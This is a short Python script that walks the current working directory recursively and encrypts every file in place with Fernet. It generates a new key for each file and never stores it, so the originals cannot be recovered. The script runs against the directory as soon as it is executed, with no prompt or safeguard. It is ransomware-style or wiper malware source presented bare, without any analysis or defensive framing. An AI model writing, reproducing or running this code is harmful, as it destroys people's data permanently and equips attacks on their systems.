import os
import sys
import platform
from cryptography.fernet import Fernet
def diskfile(path):
    total = os.path.getsize(path)
    if os.path.isdir(path):
        for fs in os.listdir(path):
            childpath=os.path.join(path,fs)
            total+=diskfile(childpath)
    print(path)
    if os.path.isdir(path)==False:
       key=Fernet.generate_key()
       fernet=Fernet(key)
       with open(path,'rb') as file:
          original=file.read()
       encrypted=fernet.encrypt(original) 
       with open(path,"wb") as encrypted_file:
          encrypted_file.write(encrypted)
    return total        
path=os.getcwd()           
diskfile(path)

